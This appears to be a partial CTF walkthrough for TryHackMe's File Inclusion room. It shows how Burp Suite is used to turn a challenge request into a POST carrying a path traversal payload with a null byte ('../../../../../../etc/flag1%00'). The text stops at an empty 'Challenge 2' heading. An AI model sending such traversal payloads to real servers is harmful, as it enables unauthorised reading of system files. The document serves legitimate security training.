# My goal is to provide methods to complete the File Inclusion room on TryHackMe using only Burpsuite and not curL as other walkthroughs do. This does assume a basic understanding of Burpsutie
# Challenge 1
For challenge one we can test out entering /etc/flag1 into the form and then view the web request in burp suite after intercepting it, the web request looks like
```
GET /challenges/chall1.php?file=%2Fetc%2Fflag HTTP/1.1
Host: [IP]
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.152.198/challenges/chall1.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
So the thign we need to do is change the http method being used to post as the challenge tells us such that <br>
```POST /challenges/chall1.php HTTP/1.1```
Curl would use the -d to add information to the request body and to do this in burpsuite we need to add headers to the original request. Specifically the Content Type and when the data is addedd the  Content-Length field should be automatically filled by Burpsuite
<br> 
<br>
Lastly we must add the null byte in order to get to the php file on the server
```
POST /challenges/chall1.php HTTP/1.1
Host: 10.10.152.198
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.152.198/challenges/chall1.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

file=../../../../../../etc/flag1%00
```
# Challenge 2
